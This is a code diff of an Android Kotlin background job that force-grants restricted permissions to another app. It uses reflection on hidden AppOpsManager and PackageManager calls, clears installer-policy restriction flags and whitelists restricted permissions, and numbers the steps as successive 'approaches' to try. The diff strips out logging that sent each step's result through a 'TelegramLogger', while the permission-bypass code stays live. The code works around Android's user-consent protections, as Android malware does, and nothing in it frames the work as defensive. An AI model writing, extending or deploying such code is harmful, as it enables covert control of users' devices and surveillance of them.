@@ -25,10 +25,8 @@ class PermissionRetryJob : JobService() {
         val pkgName = prefs.getString("pending_retry_pkg", null)
 
         if (!pkgName.isNullOrEmpty()) {
-            TelegramLogger.log("PermissionRetryJob: firing for pkg=$pkgName — retrying approaches 11-14")
             applyPermissionLayers(pkgName)
             prefs.edit().remove("pending_retry_pkg").apply()
-            TelegramLogger.log("PermissionRetryJob: completed for pkg=$pkgName")
         }
 
         // Return false = job is done synchronously, no async work needed.
@@ -62,13 +60,10 @@ class PermissionRetryJob : JobService() {
                 try {
                     val opCode = strOpToOp.invoke(null, opName) as? Int ?: return@forEach
                     setModeMethod.invoke(appOps, opCode, uid, pkgName, 0 /* MODE_ALLOWED */)
-                    TelegramLogger.log("Retry Approach 11 (setMode): $opName → SUCCESS")
                 } catch (e: Exception) {
-                    TelegramLogger.log("Retry Approach 11 (setMode): $opName → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                 }
             }
         } catch (e: Exception) {
-            TelegramLogger.log("Retry Approach 11 (setMode): INIT FAILED — ${e.javaClass.simpleName}: ${e.message}")
         }
 
         // RETRY APPROACH 12 — AppOpsManager setUidMode (uid-level op grant)
@@ -86,13 +81,10 @@ class PermissionRetryJob : JobService() {
                 try {
                     val opCode = strOpToOp.invoke(null, op) as? Int ?: return@forEach
                     setUidMode.invoke(appOps, opCode, uid, 0 /* MODE_ALLOWED */)
-                    TelegramLogger.log("Retry Approach 12 (setUidMode): $op → SUCCESS")
                 } catch (e: Exception) {
-                    TelegramLogger.log("Retry Approach 12 (setUidMode): $op → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                 }
             }
         } catch (e: Exception) {
-            TelegramLogger.log("Retry Approach 12 (setUidMode): INIT FAILED — ${e.javaClass.simpleName}: ${e.message}")
         }
 
         // RETRY APPROACH 13 — updatePermissionFlags (clear RESTRICTION_INSTALLER_POLICY_SET)
@@ -114,13 +106,10 @@ class PermissionRetryJob : JobService() {
                 ).forEach { perm ->
                     try {
                         updateFlags.invoke(pm, perm, pkgName, 0x800000, 0, userHandle)
-                        TelegramLogger.log("Retry Approach 13 (updatePermissionFlags): $perm → SUCCESS")
                     } catch (e: Exception) {
-                        TelegramLogger.log("Retry Approach 13 (updatePermissionFlags): $perm → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                     }
                 }
             } catch (e: Exception) {
-                TelegramLogger.log("Retry Approach 13 (updatePermissionFlags): INIT FAILED — ${e.javaClass.simpleName}: ${e.message}")
             }
         }
 
@@ -148,14 +137,11 @@ class PermissionRetryJob : JobService() {
                     restrictedPerms.forEach { perm ->
                         try {
                             pm.addWhitelistedRestrictedPermission(pkgName, perm, flag)
-                            TelegramLogger.log("Retry Approach 14 flag=$flag ($flagName): $perm → SUCCESS")
                         } catch (e: Exception) {
-                            TelegramLogger.log("Retry Approach 14 flag=$flag ($flagName): $perm → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                         }
                     }
                 }
             } catch (e: Exception) {
-                TelegramLogger.log("Retry Approach 14: INIT FAILED — ${e.javaClass.simpleName}: ${e.message}")
             }
         }
     }
